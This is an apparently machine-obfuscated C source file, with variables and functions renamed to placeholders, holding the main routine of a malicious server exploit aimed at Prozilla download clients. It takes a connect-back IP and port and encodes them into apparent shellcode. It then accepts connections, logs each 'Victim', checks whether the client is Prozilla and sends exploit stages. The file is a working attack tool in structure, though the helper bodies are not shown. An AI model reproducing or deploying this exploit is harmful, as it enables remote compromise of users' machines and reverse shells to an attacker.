
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






struct sockaddr_in {int sin_addr; } ;
struct sockaddr {int dummy; } ;
typedef int client_request ;


 int VAR_0 ;
 int VAR_1 ;
 scalar_t__ VAR_2 ;
 int FUNC_0 (int,struct sockaddr*,int*) ;
 int FUNC_1 (int ) ;
 int FUNC_2 (int) ;
 int FUNC_3 (int) ;
 int FUNC_4 (int,int,int) ;
 scalar_t__ FUNC_5 () ;
 int FUNC_6 (int ,char*,...) ;
 int FUNC_7 (struct sockaddr_in*) ;
 int FUNC_8 (int,char**,char*) ;
 char* FUNC_9 (int ) ;
 int FUNC_10 (struct sockaddr_in*,struct sockaddr_in*,int*) ;
 scalar_t__ FUNC_11 (int) ;
 int FUNC_12 (char*,int,int) ;
 int VAR_3 ;
 int FUNC_13 (char*) ;
 int FUNC_14 (char*) ;
 scalar_t__ FUNC_15 (int,char*,int) ;
 int VAR_4 ;
 int FUNC_16 (int,int ,int ,int ) ;
 int FUNC_17 (int) ;
 int FUNC_18 (int) ;
 int FUNC_19 (int) ;
 int FUNC_20 (int) ;
 int FUNC_21 (int) ;
 int VAR_5 ;
 int FUNC_22 (int ,char*,int*,int*,int*,int*) ;
 int VAR_6 ;
 int FUNC_23 (int ) ;
 scalar_t__ FUNC_24 (char*,char*) ;
 int FUNC_25 (char*) ;

int FUNC_26(int VAR_7,char **VAR_8)
{

   int VAR_9=194;
   int VAR_10=0,VAR_11=0;
   int VAR_12,VAR_13,VAR_14;
   int VAR_15,VAR_16;
   int VAR_17;
   int VAR_18,VAR_19;
   int VAR_20,VAR_21,VAR_22,VAR_23;
   char VAR_24 [2048];
   char VAR_25[2048];
   struct sockaddr_in *VAR_26 = (struct sockaddr_in *)FUNC_11(sizeof(struct sockaddr_in));
   struct sockaddr_in *VAR_27 = (struct sockaddr_in *)FUNC_11(sizeof(struct sockaddr_in));

   while((VAR_15=FUNC_8(VAR_7, VAR_8 ,"hc:p:"))!=VAR_0) {
           switch (VAR_15) {
               case 'h':
                   FUNC_25(VAR_8[0]);
               case 'c':
                   VAR_11=1;
                   FUNC_22(VAR_3, "%d.%d.%d.%d", &VAR_20, &VAR_21, &VAR_22,&VAR_23);
                   break;
               case 'p':
                   VAR_10=1;
                   VAR_12 = FUNC_1(VAR_3);
                   if ((VAR_12 <= 0) || (VAR_12 > 65535)) {
                       FUNC_6(VAR_6, "Invalid port.\n\n");
                       FUNC_3(1);
                   }
           }
   }
   if(VAR_10) {
       VAR_13 = (VAR_12 & 0xff00) >> 8;
       VAR_14 = (VAR_12 & 0x00ff);
   }
   else {
       VAR_12 = 8080;
       VAR_13 = (VAR_12 & 0xff00) >> 8;
       VAR_14 = (VAR_12 & 0x00ff);
   }
   if(!VAR_11) {
       FUNC_25(VAR_8[0]);
   }
   FUNC_12(VAR_24,0x0,VAR_1);
   VAR_17 = FUNC_10(VAR_26,VAR_27,&VAR_19);


   VAR_9 = FUNC_4(VAR_20,VAR_9,6);
   VAR_9 = FUNC_4(VAR_21,VAR_9,6);
   VAR_9 = FUNC_4(VAR_22,VAR_9,6);
   VAR_9 = FUNC_4(VAR_23,VAR_9,6);


   VAR_9 = 207;
   VAR_9 = FUNC_4( VAR_13,VAR_9,5);
   VAR_9 = FUNC_4( VAR_14 ,VAR_9,5);

   while(VAR_2) {
       if((VAR_18=FUNC_0(VAR_17,(struct sockaddr *)VAR_27,&VAR_19))==-1) {
           FUNC_3(1);
       }

       FUNC_6(VAR_6,"[+] Victim at : %s\n", FUNC_9(VAR_27->sin_addr));
       if (FUNC_15(VAR_18,VAR_25,sizeof(VAR_25))==0) {
           FUNC_3(1);
       }


               if(FUNC_24(VAR_25,"Prozilla"))
               {
                       FUNC_6(VAR_6,"[+] Victim using Prozilla.\n");
                       VAR_16=1;
               }
               else {
                       if(FUNC_24(VAR_25,"SSSS")) {
                   FUNC_6(VAR_6,"Nice , Victim Responded!\n");
               FUNC_21(VAR_18);
                       }
                       else {
                               FUNC_6(VAR_6,"[+] Victim is not using Prozilla! Sending a normal response.\n");
                               if(FUNC_16(VAR_18,VAR_4,FUNC_23(VAR_5),0)==-1) {
                               FUNC_13("send");
                               }
               }
               }
               if(VAR_16==1) {

               FUNC_20(VAR_18);

               FUNC_19(VAR_18);

               FUNC_18(VAR_18);

               FUNC_17(VAR_18);
                       VAR_16=0;
               }
       FUNC_2(VAR_18);
       FUNC_12(VAR_25,0x0,sizeof(VAR_25));

       if (FUNC_5()==0) {
               FUNC_7(VAR_27);
               FUNC_7(VAR_26);
               FUNC_3(0);
       }
       else {
           FUNC_2(VAR_18);
       }

   }

   FUNC_14("Done");
   return 0;
}
